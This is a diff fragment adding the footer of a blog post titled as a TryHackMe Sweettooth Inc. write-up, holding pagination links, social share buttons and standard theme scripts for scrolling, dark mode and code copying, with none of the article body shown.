+<nav class="paginav">
+  <a class="prev" href="http://xplo1t.me/posts/ide-tryhackme-writeup/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Ide Tryhackme Writeup</span>
+  </a>
+  <a class="next" href="http://xplo1t.me/posts/hack-the-box-spectra/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Hack the Box - Spectra</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe - Sweettooth Inc. (non port forward method) on twitter"
+        href="https://twitter.com/intent/tweet/?text=TryHackMe%20-%20Sweettooth%20Inc.%20%28non%20port%20forward%20method%29&amp;url=http%3a%2f%2fxplo1t.me%2fposts%2ftryhackme-sweettooth-inc-non-port-forward-method%2f&amp;hashtags=">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe - Sweettooth Inc. (non port forward method) on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2fxplo1t.me%2fposts%2ftryhackme-sweettooth-inc-non-port-forward-method%2f&amp;title=TryHackMe%20-%20Sweettooth%20Inc.%20%28non%20port%20forward%20method%29&amp;summary=TryHackMe%20-%20Sweettooth%20Inc.%20%28non%20port%20forward%20method%29&amp;source=http%3a%2f%2fxplo1t.me%2fposts%2ftryhackme-sweettooth-inc-non-port-forward-method%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe - Sweettooth Inc. (non port forward method) on reddit"
+        href="https://reddit.com/submit?url=http%3a%2f%2fxplo1t.me%2fposts%2ftryhackme-sweettooth-inc-non-port-forward-method%2f&title=TryHackMe%20-%20Sweettooth%20Inc.%20%28non%20port%20forward%20method%29">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe - Sweettooth Inc. (non port forward method) on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2fxplo1t.me%2fposts%2ftryhackme-sweettooth-inc-non-port-forward-method%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe - Sweettooth Inc. (non port forward method) on whatsapp"
+        href="https://api.whatsapp.com/send?text=TryHackMe%20-%20Sweettooth%20Inc.%20%28non%20port%20forward%20method%29%20-%20http%3a%2f%2fxplo1t.me%2fposts%2ftryhackme-sweettooth-inc-non-port-forward-method%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe - Sweettooth Inc. (non port forward method) on telegram"
+        href="https://telegram.me/share/url?text=TryHackMe%20-%20Sweettooth%20Inc.%20%28non%20port%20forward%20method%29&amp;url=http%3a%2f%2fxplo1t.me%2fposts%2ftryhackme-sweettooth-inc-non-port-forward-method%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+</div>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="http://xplo1t.me/">xplo1t&#39;s site</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
